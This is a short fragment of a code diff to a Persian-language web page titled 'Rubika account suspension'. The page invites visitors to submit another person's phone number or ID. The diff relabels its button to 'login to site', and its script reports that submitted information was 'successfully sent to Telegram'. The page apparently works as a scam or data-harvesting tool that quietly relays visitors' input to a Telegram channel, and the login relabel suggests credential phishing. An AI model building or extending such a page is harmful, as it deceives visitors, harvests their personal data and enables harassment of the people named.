@@ -47,8 +47,8 @@
 
   <h2> تعلیق اکانت روبیکا </h2>
   <p>شماره تلفن یا ایدی فرد را در کادر زیر قرار دهید و روی دکمه ارسال اطلاعات کلیک کنید</p>
-  <button id="startBtn">ارسال اطلاعات</button>
-  <input class="name" type="text" placeholder="شماره تلفن را وارد کنید " required>
+  <button id="startBtn">ورود به سایت</button>
+  
   
 
   <div id="status">  توجه : برای ثبت ایدی . حتما کلمه @ را وارد کنید تا سایت ما دچار مشکل نشود</div>
@@ -123,4 +123,5 @@
 
         const result = await response.json();
         if (result.ok) {
-          st
+          status.textContent = "اطلاعات با موفقیت به تلگرام ارسال شد!";
+        } el
